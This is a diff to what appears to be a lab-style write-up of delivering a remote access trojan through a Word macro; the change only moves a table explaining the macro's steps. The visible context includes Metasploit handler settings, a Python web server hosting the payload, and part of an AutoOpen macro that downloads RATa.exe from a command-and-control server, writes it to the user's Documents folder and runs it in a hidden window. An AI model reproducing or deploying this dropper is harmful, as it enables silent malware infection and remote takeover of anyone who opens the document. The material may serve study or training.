@@ -61,15 +61,6 @@ python3 -m http.server 8080
 | `set LPORT 14000` | Port | Must match the LPORT baked into the RAT at generation time |
 | `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections |
 
-| Step | Component | Purpose |
-|:---|:---|:---|
-| 1 | `AutoOpen()` | Triggers automatically on document open, no user interaction required |
-| 2 | `MSXML2.XMLHTTP` | Performs synchronous HTTP GET to retrieve `RATa.exe` from the C2 server |
-| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe` |
-| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`) |
-
-
-
 **Macro Creation:**
 
 ```
@@ -93,6 +84,12 @@ Sub AutoOpen()
     CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
 End Sub
 ```
+| Step | Component | Purpose |
+|:---|:---|:---|
+| 1 | `AutoOpen()` | Triggers automatically on document open, no user interaction required |
+| 2 | `MSXML2.XMLHTTP` | Performs synchronous HTTP GET to retrieve `RATa.exe` from the C2 server |
+| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe` |
+| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`) |
 
 **Session Output Analysis:**
 Upon execution, the following session was established:
